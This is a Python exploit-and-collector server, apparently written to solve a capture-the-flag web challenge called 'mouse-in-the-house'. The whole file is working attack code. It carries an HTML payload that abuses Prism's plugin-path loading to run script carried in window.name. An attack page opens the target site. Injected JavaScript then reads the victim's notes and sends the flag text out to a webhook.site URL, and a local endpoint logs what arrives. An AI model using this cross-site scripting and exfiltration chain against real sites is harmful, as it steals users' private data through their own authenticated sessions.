"""Standalone exploit+collector server for mouse-in-the-house (persistent)."""
import http.server
import json
import os
import socketserver
import urllib.parse

APP = os.environ.get("APP", "https://6feb84647f931fdf.chal.ctf.ae").rstrip("/")
PAYLOAD = "<a data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)#>"


def make_fullcode(exfil_url):
    return f"""
const o=location.origin;
const html=async u=>(await fetch(u,{{cache:'force-cache'}})).text();
(async()=>{{
 const ex=(f)=>{{try{{history.replaceState(null,'','/')}}catch(e){{}}
   location.href={json.dumps(exfil_url)}+encodeURIComponent(f)}};
 try{{
  let t='';
  for(let i=0;i<6;i++){{
   t=await html(o+'/notes/?search=');
   if(t.includes('</ul>')||!t.includes('No notes'))break;
   await new Promise(r=>setTimeout(r,700));
  }}
  const ids=[...t.matchAll(/href="\\/notes\\/([a-f0-9]{{8}})"/g)].map(m=>m[1]);
  for(const id of ids){{
   try{{
    const p=await html(o+'/notes/'+id);
    if(p.includes('flag draft')){{
     let flag=(p.match(/<main>([\\s\\S]*?)<\\/main>/)||[])[1]||'';
     flag=flag.replace(/<\\/?[^>]+>/g,'').trim();
     ex(flag);return;
    }}
   }}catch(e){{}}
  }}
  ex('NOTFOUND');
 }}catch(e){{ex('ERR:'+e.message)}}
}})();
""".strip()


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print("[SRV]", self.command, self.path)

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        if u.path == "/atk":
            nid = urllib.parse.parse_qs(u.query).get("n", [""])[0]
            wh = urllib.parse.parse_qs(u.query).get("w", [""])[0]
            exfil = f"https://webhook.site/{wh}/?f=" if wh else "https://webhook.site/MISSING/?f="
            data = "data:text/javascript," + urllib.parse.quote(make_fullcode(exfil), safe="")
            html = f"""<!doctype html><html><body>
<script>
var w=window.open({json.dumps(APP + "/notes/?search=")});
window.name={json.dumps(data)};
setTimeout(function(){{location.href={json.dumps(APP + "/notes/")}+{json.dumps(nid)}}},1500);
</script></body></html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(html.encode())
            return
        if u.path == "/c":
            flag = urllib.parse.unquote_plus(urllib.parse.parse_qs(u.query).get("f", [""])[0])
            print(f"\n[FLAG-ARRIVED] {flag}\n")
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "flag_mouse.txt"), "a") as fh:
                fh.write(flag + "\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            return
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")


class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True


if __name__ == "__main__":
    Server(("0.0.0.0", 8000), Handler).serve_forever()